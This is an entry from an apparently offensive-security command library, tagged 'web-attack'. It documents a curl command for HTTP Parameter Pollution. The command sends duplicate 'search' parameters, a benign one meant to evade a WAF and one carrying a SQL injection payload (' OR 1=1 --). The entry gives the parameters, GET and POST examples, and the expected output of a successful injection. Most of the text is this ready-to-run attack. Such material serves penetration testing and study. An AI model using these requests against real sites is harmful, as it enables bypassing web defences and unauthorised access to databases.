---
id: 9840991c-2cae-41ae-a1eb-de14ad8af197
name: curl-send-hpp-request
type: command
executor: bash
data: >-
  curl -X GET "$_TARGET_URL" -G -d "search=$_BENIGN_VALUE" -d
  "search=$_MALICIOUS_PAYLOAD"
output: null
created_at: '2023-04-06T03:55:59.018382+00:00'
updated_at: '2023-04-10T20:22:28.746787+00:00'
platforms:
  - web
tags:
  - hpp
  - web-attack
verified: true
validated: true
---

# curl-send-hpp-request

## Command

```bash
curl -X GET "$_TARGET_URL" -G -d "search=$_BENIGN_VALUE" -d "search=$_MALICIOUS_PAYLOAD"
```

## Description

This command crafts and sends an HTTP GET request with duplicate 'search' parameters to perform an HTTP Parameter Pollution attack. The first parameter is benign to evade WAF detection, while the second contains a malicious payload (e.g., SQL injection) for backend exploitation. Use this in scenarios where parameter parsing differs between security layers.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_URL | Target endpoint URL (e.g., http://example.com/search) | Yes |
| $_BENIGN_VALUE | Innocent value for first 'search' instance (e.g., Beth) | Yes |
| $_MALICIOUS_PAYLOAD | Malicious input for second 'search' instance (e.g., ' OR 1=1 --) | Yes |
| -X GET | Specify HTTP method as GET | Built-in |
| -G | Convert data to query string parameters | Built-in |
| -d | Add form data (use multiple for duplicates) | Built-in |

## Examples

### Basic Usage

```bash
curl -X GET "http://example.com/search" -G -d "search=Beth" -d "search=' OR 1=1 --"
```

Sends a polluted request; observe if backend injects while WAF passes.

### Advanced Usage (with Headers and POST)

```bash
curl -X POST "http://example.com/search" -H "Content-Type: application/x-www-form-urlencoded" -d "search=Beth" -d "search=' OR 1=1 --"
```

For POST requests, omit -G and adjust content type.

## Expected Output

HTTP/1.1 200 OK
Content-Type: text/html

<html><body>Search results for all records (due to injection)</body></html>

Or, if partially successful: SQL syntax error revealing table names. Failure: 403 Forbidden if WAF blocks both.

## Related

- [[procedures/HTTP-Parameter-Pollution-Attack]] (procedure using this command)
- [[tools/cURL]] (tool)
